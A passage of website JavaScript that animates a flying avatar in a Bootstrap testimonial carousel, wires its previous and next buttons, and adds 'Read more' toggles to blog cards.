      sourceBubble.style.removeProperty("--suction-dx");
      sourceBubble.style.removeProperty("--suction-dy");
      hideMotionTrail();
      hideFlyAvatar();
      flyAnimation = null;
    }

    if (typeof flyAvatar.animate === "function") {
      flyAnimation = flyAvatar.animate(
        [
          {
            transform: "translate(" + startX + "px, " + startY + "px) scale(0.62) rotate(" + (direction === "left" ? "-8deg" : "8deg") + ")",
            opacity: 0.96,
            filter: "blur(0px) saturate(1.06)"
          },
          {
            offset: 0.52,
            transform: "translate(" + midX + "px, " + midY + "px) scale(0.34) rotate(" + (direction === "left" ? "-3deg" : "3deg") + ")",
            opacity: 0.84,
            filter: "blur(1.2px) saturate(0.9)"
          },
          {
            offset: 0.7,
            transform: "translate(" + endX + "px, " + endY + "px) scale(0.08) rotate(0deg)",
            opacity: 0.28,
            filter: "blur(2.8px) saturate(0.78)"
          },
          {
            offset: 0.82,
            transform: "translate(" + overshootX + "px, " + (endY - 5) + "px) scale(1.24) rotate(0deg)",
            opacity: 1,
            filter: "blur(0px) saturate(1)"
          },
          {
            transform: "translate(" + endX + "px, " + endY + "px) scale(1) rotate(0deg)",
            opacity: 1,
            filter: "blur(0px) saturate(1)"
          }
        ],
        {
          duration: 860,
          easing: "cubic-bezier(0.16, 1, 0.3, 1)",
          fill: "forwards"
        }
      );

      flyAnimation.onfinish = cleanupFlyState;
      flyAnimation.oncancel = cleanupFlyState;
      return;
    }

    flyAvatar.style.transition = "transform 860ms cubic-bezier(0.16, 1, 0.3, 1), opacity 860ms ease";
    requestAnimationFrame(function () {
      flyAvatar.style.transform = "translate(" + endX + "px, " + endY + "px) scale(1) rotate(0deg)";
      flyAvatar.style.opacity = "1";
    });

    setTimeout(function () {
      cleanupFlyState();
    }, 900);
  }

  syncBubbleAvatarsFromActive();
  hideMotionTrail();
  hideFlyAvatar();

  $slider.on("slide.bs.carousel", function (event) {
    runFlyIn(event.direction, event.relatedTarget);
  });

  $slider.on("slid.bs.carousel", function () {
    syncBubbleAvatarsFromActive();
  });

  var prevBtn = slider.querySelector(".carousel-control-prev");
  var nextBtn = slider.querySelector(".carousel-control-next");

  if (prevBtn) {
    prevBtn.addEventListener("click", function (event) {
      event.preventDefault();
      event.stopPropagation();
      $slider.carousel("prev");
    });
  }

  if (nextBtn) {
    nextBtn.addEventListener("click", function (event) {
      event.preventDefault();
      event.stopPropagation();
      $slider.carousel("next");
    });
  }
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initHomeTestimonialCarousel);
} else {
  initHomeTestimonialCarousel();
}

(function initBlogCardToggles(document) {
  "use strict";

  function init() {
    var toggles = document.querySelectorAll("[data-blog-toggle]");
    if (!toggles.length) {
      return;
    }

    toggles.forEach(function (toggle) {
      var targetId = toggle.getAttribute("aria-controls");
      var details = targetId ? document.getElementById(targetId) : null;
      if (!details) {
        return;
      }

      toggle.addEventListener("click", function () {
        var isExpanded = toggle.getAttribute("aria-expanded") === "true";
        toggle.setAttribute("aria-expanded", isExpanded ? "false" : "true");
        toggle.textContent = isExpanded ? "Read more" : "Show less";
        details.hidden = isExpanded;
      });
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})(document);
